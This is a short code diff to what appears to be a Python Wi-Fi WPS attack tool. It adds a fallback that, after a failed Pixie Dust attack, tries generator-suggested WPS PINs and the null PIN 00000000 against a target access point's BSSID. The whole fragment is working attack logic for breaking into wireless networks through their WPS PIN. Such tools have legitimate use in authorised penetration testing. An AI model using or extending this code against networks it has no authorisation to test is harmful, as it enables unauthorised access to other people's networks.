@@ -5591,8 +5591,21 @@ class Companion:
                     return self.single_connection(bssid, pin=pixiedust_pin, pixiemode=False,
                                                   store_pin_on_fail=True,
                                                   output_file=output_file, freq_mhz=freq_mhz)
-                print(f'{warn} Pixie Dust failed — this AP may not be vulnerable, or the')
-                print(f'         nonce data has expired. Re-run with -K to try a fresh session.')
+                logger.warning('Pixie Dust attack failed: Pixiewps returned no PIN for BSSID %s', bssid)
+                print(f'{warn} Pixie Dust failed — Pixiewps returned no PIN (AP may not be vulnerable, or nonce data has expired).')
+                print(f'{info} Falling back to Universal PIN generator and NULL PIN (00000000)…')
+                fallback_pins = self.generator.getSuggestedList(bssid) if bssid else []
+                if '00000000' not in fallback_pins:
+                    fallback_pins.append('00000000')
+                fallback_pins = [p for p in fallback_pins if p and p != pin]
+                for f_pin in fallback_pins:
+                    print(f'{info} Fallback: Trying PIN {f_pin}…')
+                    logger.info('Pixie Dust fallback trying PIN %s for BSSID %s', f_pin, bssid)
+                    res = self.single_connection(bssid=bssid, ssid=ssid, pin=f_pin, pixiemode=False,
+                                                 store_pin_on_fail=store_pin_on_fail,
+                                                 output_file=output_file, freq_mhz=freq_mhz)
+                    if res:
+                        return res
                 return False
             else:
                 missing = []
